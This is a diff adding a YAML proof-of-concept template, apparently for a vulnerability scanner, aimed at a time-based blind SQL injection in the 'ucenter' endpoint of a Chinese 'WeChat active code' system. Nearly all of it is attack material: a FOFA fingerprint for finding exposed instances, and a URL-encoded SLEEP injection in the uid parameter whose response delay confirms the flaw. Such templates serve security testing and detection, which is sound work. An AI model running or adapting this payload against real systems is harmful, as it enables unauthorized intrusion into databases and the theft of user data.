@@ -1,0 +1,21 @@
+id: poc-yaml-wechat-active-code-system-ucenter-sqli
+info:
+  name: 微信活码系统 ucenter SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 微信活码系统
+  fofa: body=".qn-user-login"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /ucenter/index/?uid=1)
+  expression: status_code == 200 && contains(body,"无此会员") && contains(body,"活码系统")
+- method: GET
+  path: /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP({{.t1}})))RkHL)%20AND%20(1015=1015
+  expression: status_code == 200 && contains(body,"活码系统") && duration > t2 && duration
+    < t3
+transport: http
